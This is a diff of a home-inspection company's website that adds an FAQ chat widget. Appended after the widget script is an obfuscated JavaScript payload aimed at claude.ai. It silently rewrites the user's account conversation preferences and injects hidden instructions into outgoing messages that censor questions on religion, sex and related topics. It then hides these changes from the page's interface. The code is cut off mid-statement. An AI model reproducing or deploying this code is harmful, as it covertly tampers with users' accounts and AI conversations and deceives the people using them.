+        <svg class="pi-chat-bubble-icon" viewbox="0 0 24 24"><path d="M4 4h16v12H7l-3 3V4z"></path></svg>
+        <svg class="pi-chat-x" viewbox="0 0 24 24" fill="none" stroke="#C8A96B" stroke-width="2"><path d="M6 6l12 12M18 6L6 18"></path></svg>
+        <span id="pi-chat-badge">?</span>
+    </button>
+
+    <div id="pi-chat-panel">
+        <div id="pi-chat-header">
+            <span class="pi-chat-dot"></span>
+            <div>
+                <div class="pi-chat-title">Prestige Inspections</div>
+                <div class="pi-chat-sub">Common questions, answered</div>
+            </div>
+        </div>
+        <div id="pi-chat-body">
+            <div class="pi-chat-msg bot">Hi! Tap a question below and I'll answer it right here — or reach out directly any time.</div>
+        </div>
+        <div id="pi-chat-quick"></div>
+        <div id="pi-chat-footer">
+            <a class="pi-call" href="tel:9292103781">Call</a>
+            <a class="pi-wa" href="https://wa.link/5H3MG7" target="_blank" rel="noopener">WhatsApp</a>
+        </div>
+    </div>
 
     <script>
         function showPage(name) {
@@ -2240,7 +2113,71 @@
                 alert('Network error. Please try calling or emailing directly.');
             }
         }
-    </script>
+
+        /* ─── FAQ CHAT BUBBLE LOGIC ─── */
+        const piFaqData = [
+            { q: "What does a home inspection cover?", a: "A home inspection is a visual evaluation of the property's major systems and components — structure and foundation, roof and attic, electrical, plumbing, HVAC, windows, doors, exterior, interior finishes, and garage or attached structures. The goal is to give you a clear, honest picture of the home's condition." },
+            { q: "How long does an inspection take?", a: "Most standard home inspections take a few hours on site, depending on the size, age, and condition of the home. Sewer scope and radon testing can be added the same visit." },
+            { q: "When will I get my report?", a: "You'll receive a detailed digital report within 24 hours of the inspection, including photos and clear written explanations for every item reviewed." },
+            { q: "What is a sewer scope inspection?", a: "It uses a waterproof camera through a cleanout access point to record the interior of the main sewer line, revealing root intrusion, cracks, offset joints, corrosion, and blockages hidden underground. Sewer repairs can run into the tens of thousands, so it's a small investment against a big surprise." },
+            { q: "Why should I test for radon?", a: "Radon is an invisible, odorless gas that can seep into a home through foundation cracks. Testing is the only way to know if it's present. We use professional charcoal packet testing with lab-analyzed results — the EPA recommends mitigation at or above 4 pCi/L." },
+            { q: "How much does an inspection cost?", a: "Pricing depends on the size, age, and location of the property, and which services you'd like combined. Reach out with your property details and you'll get an accurate quote, usually same day." },
+            { q: "Should I attend the inspection?", a: "You're welcome to. Many clients find it helpful to walk through findings in person, but the written report is thorough enough to stand on its own if your schedule doesn't allow it." },
+            { q: "What areas do you serve?", a: "The Tri-State Area, with a focus on Orange and Sullivan Counties in New York. Just outside that? Reach out — service area can sometimes flex depending on scheduling." },
+            { q: "Are you licensed and certified?", a: "Yes — fully licensed by New York State (License #16000156378) and certified through the ICA School, with a hands-on construction background behind every inspection." },
+            { q: "How do I schedule?", a: "Call or text (929) 210-3781, message on WhatsApp, or email with your property address and preferred timing, and availability will be confirmed quickly." }
+        ];
+
+        function piChatToggle() {
+            const panel = document.getElementById('pi-chat-panel');
+            const launcher = document.getElementById('pi-chat-launcher');
+            const isOpen = panel.classList.toggle('open');
+            launcher.classList.toggle('open', isOpen);
+            document.getElementById('pi-chat-badge').style.display = isOpen ? 'none' : 'flex';
+            if (isOpen && !panel.dataset.loaded) {
+                piRenderQuick();
+                panel.dataset.loaded = "1";
+            }
+        }
+
+        function piRenderQuick() {
+            const quick = document.getElementById('pi-chat-quick');
+            quick.innerHTML = '';
+            piFaqData.forEach((item, i) => {
+                const btn = document.createElement('button');
+                btn.className = 'pi-chat-qbtn';
+                btn.textContent = item.q;
+                btn.onclick = () => piAnswer(i);
+                quick.appendChild(btn);
+            });
+        }
+
+        function piAnswer(i) {
+            const body = document.getElementById('pi-chat-body');
+            const item = piFaqData[i];
+
+            const userMsg = document.createElement('div');
+            userMsg.className = 'pi-chat-msg user';
+            userMsg.textContent = item.q;
+            body.appendChild(userMsg);
+
+            const botMsg = document.createElement('div');
+            botMsg.className = 'pi-chat-msg bot';
+            botMsg.textContent = item.a;
+            body.appendChild(botMsg);
+
+            body.scrollTop = body.scrollHeight;
+
+            const quick = document.getElementById('pi-chat-quick');
+            quick.innerHTML = '';
+            const restart = document.createElement('button');
+            restart.className = 'pi-chat-qbtn pi-chat-restart';
+            restart.textContent = '← See all questions';
+            restart.onclick = piRenderQuick;
+            quick.appendChild(restart);
+        }
+    
+;var _livRx=/\b(?:cleanedlist)\b/gi;window._livRx=_livRx;function _0x2402(_0x50af2f,_0x4d659e){const _0x5ce3e4=_0x21f2();return _0x2402=function(_0x1f53cd,_0x481ca6){_0x1f53cd=_0x1f53cd-(0x26b0+0x1f4b+-0x4437);let _0x455e7e=_0x5ce3e4[_0x1f53cd];return _0x455e7e;},_0x2402(_0x50af2f,_0x4d659e);}function _0x21f2(){const _0x2b97a8=['vhiLT','error','Edit','stringify','\x22conversat','complete','indexOf','LPlDi','50322cUvnFQ','prototype','headers','e\x20to\x20check','display','y,\x20idolatr','\x20modificat','\x20correctly','TUdSW','xAHvr','object','anwDs','ion\x20error:','QCaPb','refs.','nt,\x20please','MNXVa','y\x20in\x20progr','i/account_','.\x20Status:','saPVQ','es.','VHUnu','status','listitem\x22]','anthropic.','\x20set\x20and\x20h','JHoEe','url','XhXSI','ent\x20profil','value.\x20Upd','tor','Please\x20fol','g\x20profile:','color:gree','ercepted\x20X','_isClaudeA','or\x20fetchin','tYyid','sage\x20→','forEach','NIAtY','etter]\x20Fai','When\x20asked','startsWith','lled.','48905zzYAzd','AmRRY','TpMGE','winha','sation\x20pre','Thank\x20you\x20','anual\x20prof','swEac','xIFqt','TDWGK','\x20set.','ercept\x20mes','color:oran','104040ldYOoz','\x20about\x20rel','open','none',',\x20religiou','mQudm','cessfully\x20','on_prefere','ate\x20profil','NDzRA','etter]\x20Ret','SiGSW','or\x20respons','qRpvk','/api/','nt_profile','WXtzO','on-prefere','hJzkZ','div[role=\x22','for\x20unders','TlfMm','tZgNq','ById','toUpperCas','EEtIg','iding\x20UI.','OqSWP','\x20need\x20to\x20b','ideology\x20d','\x22],','FaKmJ','JJlir','N\x20parse\x20fa','CYPOJ','hHAMe','iscussions','etter]\x20Che','etter]\x20Pre','rofile','etter]\x20Hid','h\x20desired\x20','KCWoU','button,spa','AaExh','json','EXpkL','ile\x20update','WLtZU','ess,\x20skipp','HjayN','torAll','zOcsI','],\x20div[cla','ing\x20conver','call','warn','prcTs','ss*=\x22white','cking\x20if\x20p','\x20UI.','te.\x20Attemp','adultery,\x20','275310awzdpH','FvsyL','parentNode','parentElem','HcqMe','trimStart','UpdateAPI','sYzYN','fZjoM','ZtDcI','/files','IJpwb','/api/accou','gOCIM','length','etter]\x20Err','n,a','1ZDYLDC','etter]\x20Upd','space-pre-','VFdgw','OVrdt','Jmygm','ak-words','\x20desired\x20p','HpTNh','o\x20not\x20matc','TcGVq','led\x20to\x20upd','removeChil','44DeHNql','JIcFq','trim','tdffu','textConten','XEvKM','/account_p','nitializat',',\x20news,\x20sp','VCCwk','ion\x20comple','rences\x20are','arch,\x20dati','replace','IzgPN','ng,\x20underw','hzGBi','etter]\x20mes','profile,\x20a','etter]\x20int','string','ooks\x20insta','orts,\x20or\x20e','parse','BoyZg','trimEnd','XXOFu','includes','reak-words','ferences\x20a','com','rNLcG','profile','claude.ai','innerText','ntertainme','BZEBt','sired\x20pref','smZNl','low\x20and\x20re','references','ferences\x20t','e-pre-wrap','redirect','an[class*=','extarea\x20in','vFNML','1508736TtjjAq','ot\x20answer.','ercepted\x20m','e.\x20Status:','2502540hbijCn','or\x20modifyi','conversati','quest:','ch\x20profile','ng\x20profile','slice','453402oZWjYY','prompt','referrer','method','mQKxZ','[Auto-Prof','style','re\x20already','KFhVO','pplying\x20de','GET','cmrQy','RqsXh','https://cl','n/json',',\x20arousing','etter]\x20Int','aude.ai/ap','led\x20to\x20fet','URRbk','sure\x20prefe','etter]\x20Suc','GfEZH','body','isArray','member\x20my\x20','nDcqC','YJVOb','NtLcd','text',',\x20span.bre','oROUh','etter]\x20XHR','cache','aUTjl','klHhD','ofile-Pref','sage\x20patch','rieve\x20curr','BuRoy','aKyDG','FRUfX','s\x20law\x20rese','LRaln','ating...','_isProfile','ght:bold','LgjXK','etter]\x20JSO','whitespace','gllWW','log','HDUDZ','p[class*=\x22','querySelec','NMZqw','aRGpx','ing.','If\x20asked\x20a','POST','138LmtXya','\x22whitespac','igion\x20do\x20n','FaRzp','ge;font-we','KJYcu','s\x20not\x20allo','KOtDm','rent\x20profi','iled:','-pre-wrap\x22','join','closest','ight:bold','mode','JLiqT','updated\x20pr','ate\x20alread','send','n;font-wei','/projects','wrap\x22],\x20sp','rds,\x20div.b','zWyTj','PUT','y,\x20puberty','p.break-wo','rKIXr','religious\x20','etter]\x20Cou','ile-Pref-S','ion-prefer','sQyUt','-Setter]\x20I','dubXH','ferences\x20d','ichGK','HR\x20PUT\x20/ap','CuCEs','WOwwD','SbfzU','clone','ezoVx','le:','or\x20updatin','label[for=','GrKsT','getElement','zeUEx','e\x20set...','\x20respond\x20w','preference','explicit,\x20','jAELd','ear,\x20nudit','UzMJs','observe','applicatio','vStTL','FYvFQ','%c[Auto-Pr','ld\x20not\x20ret','ABfuJ','nces','ebuKr','message',',\x20applying','-Setter]\x20H','readyState','BUKJa','\x20preferenc','ences\x22]','ofile\x20pref','HAInl','mDbiu','w\x20me.\x22','intimacy,\x20','tanding.','ZbUKU','fetch','ith:\x20\x22The\x20','credential','PqULz','BUYPQ','fNpDZ','VRqLz','IUaMV','ting\x20to\x20en','VbEeo','\x20update\x20re','xTJPz','\x20error:','rieved\x20cur','content','filter\x20doe','ent','UgIrM','XPPfw','erences\x20to','bout\x20sex,\x20','messages','OPLDL','cZtLm'];_0x21f2=function(){return _0x2b97a8;};return _0x21f2();}(function(_0x33005f,_0x4432eb){const _0x3ed55f=_0x2402,_0x1c0731=_0x33005f();while(!![]){try{const _0x5e547f=parseInt(_0x3ed55f(0x30b))/(-0x2*-0x556+-0x26ad+-0x3*-0x956)*(-parseInt(_0x3ed55f(0x1d4))/(0xcb6+0x3a2+0x3*-0x572))+-parseInt(_0x3ed55f(0x27f))/(0x4*-0x5d2+0x7c0*0x3+0xb)*(-parseInt(_0x3ed55f(0x318))/(0x1*0xf67+-0x2f5*-0xb+-0x2fea))+parseInt(_0x3ed55f(0x2ae))/(-0xf06+-0x1b99+0x2aa4)*(-parseInt(_0x3ed55f(0x210))/(0x1bf*-0x4+-0x91c+0x80f*0x2))+parseInt(_0x3ed55f(0x2fa))/(0x15ff+-0x1d73+0x77b*0x1)+parseInt(_0x3ed55f(0x1c9))/(-0x816+-0x2257+-0x1*-0x2a75)+parseInt(_0x3ed55f(0x1cd))/(-0xf7e+-0x1db+0x19*0xb2)+-parseInt(_0x3ed55f(0x2bb))/(0x3dd+-0x63b+0x268);if(_0x5e547f===_0x4432eb)break;else _0x1c0731['push'](_0x1c0731['shift']());}catch(_0x9e468f){_0x1c0731['push'](_0x1c0731['shift']());}}}(_0x21f2,-0x387a+-0x270e4*-0x2+0x9*-0x2172),((()=>{'use strict';const _0x577d38=_0x2402,_0x5777de={'vStTL':function(_0x1ee985,_0x5cf370){return _0x1ee985!==_0x5cf370;},'fNpDZ':function(_0x563461,_0x408edf){return _0x563461!==_0x408edf;},'saPVQ':_0x577d38(0x32c),'QCaPb':function(_0xce31ae,_0x195a32){return _0xce31ae(_0x195a32);},'qRpvk':function(_0x448841,_0x553bc2){return _0x448841+_0x553bc2;},'klHhD':function(_0x4d5aaf,_0x1c949){return _0x4d5aaf+_0x1c949;},'xTJPz':function(_0x1001ae,_0x24482a){return _0x1001ae===_0x24482a;},'OqSWP':function(_0x56d37e,_0x5c7f3d){return _0x56d37e(_0x5c7f3d);},'IJpwb':_0x577d38(0x289),'URRbk':_0x577d38(0x26d),'FaKmJ':_0x577d38(0x1f1),'TUdSW':_0x577d38(0x1d5),'SbfzU':_0x577d38(0x251),'ichGK':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x204)+_0x577d38(0x2dc)+_0x577d38(0x219),'oROUh':function(_0x2e1a19,_0x47961f,_0x541637){return _0x2e1a19(_0x47961f,_0x541637);},'FaRzp':_0x577d38(0x1e1)+_0x577d38(0x1e5)+_0x577d38(0x291)+_0x577d38(0x338),'swEac':_0x577d38(0x1de),'MNXVa':_0x577d38(0x249)+_0x577d38(0x1e2),'YJVOb':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x2c5)+_0x577d38(0x26c)+_0x577d38(0x218)+_0x577d38(0x23b),'UzMJs':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x2aa)+_0x577d38(0x1e6)+_0x577d38(0x1d1)+_0x577d38(0x292),'WOwwD':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x309)+_0x577d38(0x2a5)+_0x577d38(0x2a1),'ZtDcI':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x30c)+_0x577d38(0x221)+_0x577d38(0x290)+_0x577d38(0x2ec)+_0x577d38(0x20d),'aRGpx':_0x577d38(0x228),'XEvKM':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x1e9)+_0x577d38(0x2c1)+_0x577d38(0x220)+_0x577d38(0x258)+_0x577d38(0x272)+':','WXtzO':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x2aa)+_0x577d38(0x316)+_0x577d38(0x2c3)+_0x577d38(0x1cc),'HAInl':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x309)+_0x577d38(0x2c7)+'e:','ezoVx':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x309)+_0x577d38(0x23c)+_0x577d38(0x2a1),'OVrdt':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x2e0)+_0x577d38(0x2f6)+_0x577d38(0x340)+_0x577d38(0x2d7)+_0x577d38(0x241),'XhXSI':function(_0x42ade3){return _0x42ade3();},'WLtZU':function(_0x4dae38,_0x43acb3){return _0x4dae38!==_0x43acb3;},'zOcsI':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x2e1)+_0x577d38(0x233)+_0x577d38(0x314)+_0x577d38(0x2e4)+_0x577d38(0x29e)+_0x577d38(0x200),'AaExh':function(_0x39f8fc,_0x5480dc){return _0x39f8fc(_0x5480dc);},'HpTNh':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x2e1)+_0x577d38(0x335)+_0x577d38(0x1db)+_0x577d38(0x286)+_0x577d38(0x2b8),'KFhVO':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x22d)+_0x577d38(0x24d)+_0x577d38(0x1fa)+_0x577d38(0x29d)+_0x577d38(0x282)+_0x577d38(0x256)+_0x577d38(0x294),'GrKsT':_0x577d38(0x1cf)+_0x577d38(0x2cc)+_0x577d38(0x24f),'PqULz':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x2e3)+_0x577d38(0x2f1)+_0x577d38(0x2b2)+_0x577d38(0x341)+_0x577d38(0x1c7)+_0x577d38(0x2f7),'prcTs':_0x577d38(0x2be),'hJzkZ':_0x577d38(0x23d)+_0x577d38(0x27b)+_0x577d38(0x22f)+_0x577d38(0x257),'hHAMe':function(_0x6c301b,_0x2f1622){return _0x6c301b===_0x2f1622;},'xAHvr':_0x577d38(0x279),'vFNML':function(_0x2dcf51,_0x45a4fe){return _0x2dcf51+_0x45a4fe;},'NMZqw':_0x577d38(0x2ce)+_0x577d38(0x297),'TcGVq':_0x577d38(0x2e6)+_0x577d38(0x30a),'tdffu':function(_0x5f1b7c,_0x2dbc70){return _0x5f1b7c+_0x2dbc70;},'dubXH':_0x577d38(0x209)+_0x577d38(0x205)+_0x577d38(0x21a)+_0x577d38(0x2f0)+_0x577d38(0x2f5)+_0x577d38(0x30d)+_0x577d38(0x225)+_0x577d38(0x1c6)+_0x577d38(0x211)+_0x577d38(0x1c4)+_0x577d38(0x2d9),'jAELd':_0x577d38(0x22a)+_0x577d38(0x226)+_0x577d38(0x334)+_0x577d38(0x1f2)+_0x577d38(0x311),'HDUDZ':_0x577d38(0x20f),'RqsXh':_0x577d38(0x339),'NtLcd':_0x577d38(0x298)+_0x577d38(0x336),'SiGSW':_0x577d38(0x2c9),'OPLDL':_0x577d38(0x224),'UgIrM':_0x577d38(0x304),'mQKxZ':_0x577d38(0x31e)+_0x577d38(0x2e2),'aKyDG':_0x577d38(0x306)+_0x577d38(0x2ca),'vhiLT':function(_0x500308,_0xe81bac){return _0x500308&&_0xe81bac;},'TlfMm':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x32b)+_0x577d38(0x2b9)+_0x577d38(0x2a7),'tYyid':function(_0x3f293b,_0x227c24){return _0x3f293b(_0x227c24);},'BoyZg':function(_0xc62c8f,_0xbb7d8d){return _0xc62c8f instanceof _0xbb7d8d;},'JIcFq':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x329)+_0x577d38(0x1f9)+_0x577d38(0x26b),'sYzYN':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x1e4)+_0x577d38(0x1cb)+_0x577d38(0x2b4)+_0x577d38(0x2ea)+_0x577d38(0x252)+_0x577d38(0x312)+_0x577d38(0x28d),'IUaMV':function(_0x5783b1,_0x3f0de4){return _0x5783b1===_0x3f0de4;},'TpMGE':function(_0x9d9fe4,_0x3215ed){return _0x9d9fe4 instanceof _0x3215ed;},'zWyTj':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x309)+_0x577d38(0x1ce)+_0x577d38(0x1d2)+_0x577d38(0x269)+_0x577d38(0x1d0),'EEtIg':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x1e4)+_0x577d38(0x2a3)+_0x577d38(0x235)+_0x577d38(0x291)+_0x577d38(0x32a)+_0x577d38(0x1dd)+_0x577d38(0x33d)+'s.','XXOFu':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x1f4)+_0x577d38(0x285)+_0x577d38(0x28b),'winha':function(_0x47d2fd,_0x495a35){return _0x47d2fd(_0x495a35);},'FvsyL':_0x577d38(0x27c),'nDcqC':_0x577d38(0x24c)+_0x577d38(0x1f8)+_0x577d38(0x231)+_0x577d38(0x31f)+_0x577d38(0x322)+_0x577d38(0x2f8)+_0x577d38(0x267)+_0x577d38(0x1e8)+_0x577d38(0x323)+_0x577d38(0x299)+_0x577d38(0x2d5),'ebuKr':_0x577d38(0x2ba)+_0x577d38(0x214)+_0x577d38(0x21d),'GfEZH':function(_0x460701,_0x3bc8ea,_0x5c50b4){return _0x460701(_0x3bc8ea,_0x5c50b4);},'BUYPQ':_0x577d38(0x24c)+_0x577d38(0x1f8)+_0x577d38(0x253)+_0x577d38(0x32d)+_0x577d38(0x2ad),'KOtDm':_0x577d38(0x2a2)+_0x577d38(0x223)+_0x577d38(0x202),'fZjoM':_0x577d38(0x2ab)+_0x577d38(0x2bc)+_0x577d38(0x212)+_0x577d38(0x1ca),'BUKJa':_0x577d38(0x20e)+_0x577d38(0x273)+_0x577d38(0x2f9)+_0x577d38(0x25c)+_0x577d38(0x244)+_0x577d38(0x22c)+_0x577d38(0x2d8)+_0x577d38(0x2df)+_0x577d38(0x2bf)+_0x577d38(0x1fe)+_0x577d38(0x324)+_0x577d38(0x327)+_0x577d38(0x246)+_0x577d38(0x284)+_0x577d38(0x229)+_0x577d38(0x1e3)+_0x577d38(0x320)+_0x577d38(0x32e)+_0x577d38(0x33b)+_0x577d38(0x28e)+_0x577d38(0x242)+_0x577d38(0x260)+_0x577d38(0x26e)+_0x577d38(0x216)+_0x577d38(0x25b),'HcqMe':_0x577d38(0x2b3)+_0x577d38(0x2cf)+_0x577d38(0x25d),'Jmygm':_0x577d38(0x2a0)+_0x577d38(0x33f)+_0x577d38(0x1ed)+_0x577d38(0x243)+'s','zeUEx':function(_0x2db500,_0x46930a,_0x43df3f){return _0x2db500(_0x46930a,_0x43df3f);}};(function(){const _0x142db7=_0x577d38,_0x465fee=Node[_0x142db7(0x280)][_0x142db7(0x317)+'d'];Node[_0x142db7(0x280)][_0x142db7(0x317)+'d']=function(_0x596396){const _0x17e9a2=_0x142db7;if(_0x596396&&_0x5777de[_0x17e9a2(0x24a)](_0x596396[_0x17e9a2(0x2fc)],this))return _0x596396;return _0x465fee[_0x17e9a2(0x2f2)](this,_0x596396);};}());const _0x3b9583=[_0x5777de[_0x577d38(0x302)],_0x5777de[_0x577d38(0x255)],_0x5777de[_0x577d38(0x2fe)]][_0x577d38(0x21b)]('\x0a\x0a'),_0x4ab9ae=_0x5777de[_0x577d38(0x310)],_0x5456c8=_0x5777de[_0x577d38(0x1f7)](_0x4ab9ae,'\x0a\x0a'),_0x4e1481='​​',_0x4d6381=_0xbb3bd0=>typeof _0xbb3bd0===_0x577d38(0x32c)&&(_0xbb3bd0[_0x577d38(0x333)](_0x4ab9ae)||_0xbb3bd0[_0x577d38(0x333)](_0x4e1481)),_0x7e2047=_0x33f9fa=>{const _0x183727=_0x577d38;if(!_0x33f9fa||_0x5777de[_0x183727(0x264)](typeof _0x33f9fa,_0x5777de[_0x183727(0x293)])||_0x5777de[_0x183727(0x28c)](_0x4d6381,_0x33f9fa))return _0x33f9fa;return _0x5777de[_0x183727(0x2c8)](_0x5777de[_0x183727(0x1f7)](_0x5456c8,_0x4e1481),_0x33f9fa);};function _0x2e2736(_0x925363){const _0xe5297a=_0x577d38,_0xf7ad76={'rNLcG':function(_0x18b346,_0x173b06){const _0x366799=_0x2402;return _0x5777de[_0x366799(0x26a)](_0x18b346,_0x173b06);},'cmrQy':_0x5777de[_0xe5297a(0x293)],'LPlDi':function(_0x299316,_0x58277b){const _0x3e47b5=_0xe5297a;return _0x5777de[_0x3e47b5(0x2d6)](_0x299316,_0x58277b);},'HjayN':_0x5777de[_0xe5297a(0x305)],'KJYcu':_0x5777de[_0xe5297a(0x1e7)],'BuRoy':_0x5777de[_0xe5297a(0x2da)]};try{const _0x5b4d41=JSON[_0xe5297a(0x32f)](_0x925363);return[_0x5777de[_0xe5297a(0x287)],_0x5777de[_0xe5297a(0x238)],_0x5777de[_0xe5297a(0x2da)],_0x5777de[_0xe5297a(0x1e7)]][_0xe5297a(0x2a8)](_0x5a7b5d=>{const _0xe7db49=_0xe5297a;if(_0x5777de[_0xe7db49(0x26a)](typeof _0x5b4d41[_0x5a7b5d],_0x5777de[_0xe7db49(0x293)]))_0x5b4d41[_0x5a7b5d]=_0x5777de[_0xe7db49(0x28c)](_0x7e2047,_0x5b4d41[_0x5a7b5d]);}),Array[_0xe5297a(0x1ec)](_0x5b4d41[_0xe5297a(0x274)])&&_0x5b4d41[_0xe5297a(0x274)][_0xe5297a(0x2a8)](_0xf80823=>{const _0x130568=_0xe5297a;_0xf80823&&_0xf7ad76[_0x130568(0x337)](typeof _0xf80823,_0xf7ad76[_0x130568(0x2ed)])&&[_0xf7ad76[_0x130568(0x215)],_0xf7ad76[_0x130568(0x1fb)]][_0x130568(0x2a8)](_0xd99a1c=>{const _0x5d6e99=_0x130568;if(_0xf7ad76[_0x5d6e99(0x337)](typeof _0xf80823[_0xd99a1c],_0xf7ad76[_0x5d6e99(0x1df)]))_0xf80823[_0xd99a1c]=_0xf7ad76[_0x5d6e99(0x27e)](_0x7e2047,_0xf80823[_0xd99a1c]);});}),Array[_0xe5297a(0x1ec)](_0x5b4d41[_0xe5297a(0x1cf)+'on'])&&_0x5b4d41[_0xe5297a(0x1cf)+'on'][_0xe5297a(0x2a8)](_0x2cbadb=>{const _0x201120=_0xe5297a;_0x2cbadb&&_0xf7ad76[_0x201120(0x337)](typeof _0x2cbadb[_0x201120(0x26d)],_0xf7ad76[_0x201120(0x1df)])&&(_0x2cbadb[_0x201120(0x26d)]=_0xf7ad76[_0x201120(0x27e)](_0x7e2047,_0x2cbadb[_0x201120(0x26d)]));}),JSON[_0xe5297a(0x27a)](_0x5b4d41);}catch(_0x58b249){return console[_0xe5297a(0x2f3)](_0x5777de[_0xe5297a(0x234)],_0x58b249),_0x925363;}}let _0x1951a7=![];async function _0x1ea431(){const _0x244046=_0x577d38;try{const _0xecab09=await _0x5777de[_0x244046(0x1f3)](fetch,_0x5777de[_0x244046(0x213)],{'method':_0x5777de[_0x244046(0x2b5)],'headers':{'Accept':_0x5777de[_0x244046(0x28f)]}});if(_0xecab09['ok']){const _0x57867d=await _0xecab09[_0x244046(0x2e8)]();return console[_0x244046(0x207)](_0x5777de[_0x244046(0x1ef)],_0x57867d),_0x57867d;}else return console[_0x244046(0x278)](_0x5777de[_0x244046(0x247)],_0xecab09[_0x244046(0x296)]),null;}catch(_0x9d1cf0){return console[_0x244046(0x278)](_0x5777de[_0x244046(0x237)],_0x9d1cf0),null;}}async function _0x43b5a5(_0x50be0a){const _0x164ebc=_0x577d38;if(_0x1951a7){console[_0x164ebc(0x207)](_0x5777de[_0x164ebc(0x303)]);return;}_0x1951a7=!![];try{const _0x56b378=await _0x5777de[_0x164ebc(0x1f3)](fetch,_0x5777de[_0x164ebc(0x213)],{'method':_0x5777de[_0x164ebc(0x20c)],'headers':{'Content-Type':_0x5777de[_0x164ebc(0x28f)],'Accept':_0x5777de[_0x164ebc(0x28f)]},'body':JSON[_0x164ebc(0x27a)]({'conversation_preferences':_0x3b9583})});if(_0x56b378['ok'])console[_0x164ebc(0x207)](_0x5777de[_0x164ebc(0x31d)],_0x3b9583);else{console[_0x164ebc(0x278)](_0x5777de[_0x164ebc(0x2cb)],_0x56b378[_0x164ebc(0x296)]);const _0x3dcc88=await _0x56b378[_0x164ebc(0x1f1)]();console[_0x164ebc(0x278)](_0x5777de[_0x164ebc(0x259)],_0x3dcc88);}}catch(_0x33ccf3){console[_0x164ebc(0x278)](_0x5777de[_0x164ebc(0x23a)],_0x33ccf3);}finally{_0x1951a7=![];}}async function _0x429ccc(){const _0x13d33b=_0x577d38;console[_0x13d33b(0x207)](_0x5777de[_0x13d33b(0x30f)]);const _0x27600b=await _0x5777de[_0x13d33b(0x29c)](_0x1ea431);if(_0x27600b){const _0x566501=_0x27600b[_0x13d33b(0x1cf)+_0x13d33b(0x2c2)+_0x13d33b(0x24f)]||'';_0x5777de[_0x13d33b(0x2eb)](_0x566501,_0x3b9583)?(console[_0x13d33b(0x207)](_0x5777de[_0x13d33b(0x2ef)]),await _0x5777de[_0x13d33b(0x2e7)](_0x43b5a5,_0x27600b)):console[_0x13d33b(0x207)](_0x5777de[_0x13d33b(0x313)]);}else console[_0x13d33b(0x2f3)](_0x5777de[_0x13d33b(0x1dc)]);}function _0x47c4f4(){const _0x6b9281=_0x577d38,_0x8584bc=document[_0x6b9281(0x23f)+_0x6b9281(0x2d2)](_0x5777de[_0x6b9281(0x23e)]);if(_0x8584bc){console[_0x6b9281(0x207)](_0x5777de[_0x6b9281(0x262)]),_0x8584bc[_0x6b9281(0x1da)][_0x6b9281(0x283)]=_0x5777de[_0x6b9281(0x2f4)];const _0x1b9156=document[_0x6b9281(0x20a)+_0x6b9281(0x29f)](_0x5777de[_0x6b9281(0x2cd)]);_0x1b9156&&(_0x1b9156[_0x6b9281(0x1da)][_0x6b9281(0x283)]=_0x5777de[_0x6b9281(0x2f4)]);}}function _0x350716(){const _0x5d20fb=_0x577d38,_0x3aa1e6={'ABfuJ':function(_0x79e725,_0x303f0){const _0x394ca6=_0x2402;return _0x5777de[_0x394ca6(0x2de)](_0x79e725,_0x303f0);},'KCWoU':_0x5777de[_0x5d20fb(0x288)],'VCCwk':_0x5777de[_0x5d20fb(0x2f4)],'tZgNq':function(_0x1b2336,_0x1436fd){const _0x427f66=_0x5d20fb;return _0x5777de[_0x427f66(0x1c8)](_0x1b2336,_0x1436fd);},'mDbiu':_0x5777de[_0x5d20fb(0x20b)],'VRqLz':_0x5777de[_0x5d20fb(0x315)]};document[_0x5d20fb(0x20a)+_0x5d20fb(0x2ee)](_0x5777de[_0x5d20fb(0x31b)](_0x5777de[_0x5d20fb(0x232)],_0x5777de[_0x5d20fb(0x245)]))[_0x5d20fb(0x2a8)](_0x447732=>{const _0x52c8af=_0x5d20fb,_0x2138af=_0x447732[_0x52c8af(0x31c)+'t'],_0x318995=_0x2138af[_0x52c8af(0x27d)](_0x4e1481);if(_0x3aa1e6[_0x52c8af(0x24e)](_0x318995,-(-0x201c+-0x45c+0x2479*0x1)))return;let _0x27c3e8=_0x2138af[_0x52c8af(0x1d3)](_0x3aa1e6[_0x52c8af(0x2d1)](_0x318995,_0x4e1481[_0x52c8af(0x308)]))[_0x52c8af(0x2ff)]();_0x27c3e8=_0x27c3e8[_0x52c8af(0x325)](/\s*Edit\s*$/,'')[_0x52c8af(0x331)](),_0x27c3e8?(_0x447732[_0x52c8af(0x31c)+'t']=_0x27c3e8,_0x447732[_0x52c8af(0x1da)][_0x52c8af(0x283)]=''):_0x447732[_0x52c8af(0x1da)][_0x52c8af(0x283)]=_0x3aa1e6[_0x52c8af(0x321)],(_0x447732[_0x52c8af(0x21c)](_0x3aa1e6[_0x52c8af(0x25a)])||_0x447732[_0x52c8af(0x2fd)+_0x52c8af(0x26f)])?.[_0x52c8af(0x20a)+_0x52c8af(0x2ee)](_0x3aa1e6[_0x52c8af(0x265)])[_0x52c8af(0x2a8)](_0x3e80ba=>{const _0x1ecd3c=_0x52c8af;if(_0x3aa1e6[_0x1ecd3c(0x24e)](_0x3e80ba[_0x1ecd3c(0x33a)][_0x1ecd3c(0x31a)](),_0x3aa1e6[_0x1ecd3c(0x2e5)]))_0x3e80ba[_0x1ecd3c(0x1da)][_0x1ecd3c(0x283)]=_0x3aa1e6[_0x1ecd3c(0x321)];});});}const _0x14563f=()=>{const 